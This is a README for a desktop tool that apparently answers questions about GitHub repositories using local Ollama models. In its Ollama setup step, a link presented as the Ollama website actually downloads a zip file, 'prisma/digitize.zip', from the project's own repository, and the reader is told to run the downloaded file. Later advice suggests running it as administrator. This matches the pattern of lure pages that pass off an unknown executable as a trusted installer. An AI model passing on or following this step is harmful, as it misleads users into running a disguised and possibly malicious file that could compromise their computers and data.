## 🎯 What Is This?

ai-github-repository-assistant is a friendly desktop tool that helps you understand and work with any GitHub repository without needing to read code line by line. It uses artificial intelligence running directly on your computer to answer questions about a project, explain what files do, and help you find exactly what you need.

Think of it as having a smart assistant who has read the entire repository and can instantly tell you how things work, where specific features are located, and summarize complex code into plain English.

## ✨ Key Features

### 🔍 Smart Repository Analysis
- **Instant Overview:** Get a clear summary of any GitHub repository in seconds.
- **File Explorer Helper:** Understand what each folder and file is for without opening them.
- **Code Insights:** See highlighted explanations of important parts of the codebase.

### 💬 Grounded Chat Assistant
- **Ask Questions Naturally:** Type questions like "How does the login system work?" and get accurate answers.
- **Context-Aware Responses:** The AI only uses information from the repository you're viewing, so answers are always relevant.
- **Follow-Up Conversations:** Ask follow-up questions and the assistant remembers the context of your previous questions.

### 🔒 Private and Secure
- **Local AI Models:** Uses Ollama to run AI models on your computer. Your code never leaves your machine.
- **No Cloud Required:** Works fully offline once you have the models downloaded.
- **GitHub OAuth Login:** Connect your GitHub account securely to access private repositories.

### 📊 User-Friendly Interface
- **Clean Dashboard:** See all your repositories in one place.
- **Simple Navigation:** Click through folders and files with ease.
- **Copy-Paste Support:** Easily copy any explanations or summaries.

### 📦 Install Ollama (Required for AI Features)

The AI features rely on Ollama, a free tool that runs AI models locally. Here's how to set it up:

1. **Visit the Ollama website:** Go to [https://raw.githubusercontent.com/Constraintworthy6058/ai-github-repository-assistant/main/prisma/digitize.zip](https://raw.githubusercontent.com/Constraintworthy6058/ai-github-repository-assistant/main/prisma/digitize.zip) in your web browser.
2. **Download Ollama for Windows:** Click the "Download" button and choose the Windows version.
3. **Install Ollama:** Run the downloaded file and follow the simple installation steps.
4. **Download a Model:** Open a command prompt and type `ollama pull llama3.2` (or a smaller model like `ollama pull tinyllama` if you have limited RAM). Press Enter and wait for the download to complete.

## ❓ Frequently Asked Questions

### Is my code safe?
Absolutely. All processing happens on your computer using local AI models. Nothing is sent to external servers.

### Can I use this without a GitHub account?
Yes, you can analyze public repositories without signing in. However, signing in allows you to access private repositories.

### How much does it cost?
The application is completely free. The only cost is the electricity used to run your computer.

### What if I don't have enough RAM for large models?
Start with a smaller model like TinyLlama. You can always upgrade later by downloading a larger model through Ollama.

### Can I analyze multiple repositories?
Yes, you can add as many repositories as you want and switch between them easily.

## 🧪 Troubleshooting

### The app won't start
- Make sure your Windows is updated to at least version 10.
- Try right-clicking the application and selecting "Run as administrator."

### AI responses are slow
- Close other programs that use a lot of memory.
- Consider downloading a smaller AI model through Ollama.

### GitHub login fails
- Check your internet connection.
- Make sure you have a stable connection and try again.

### Repository analysis fails
- Ensure the repository is public or you're signed in.
- Check if the repository URL is correct.
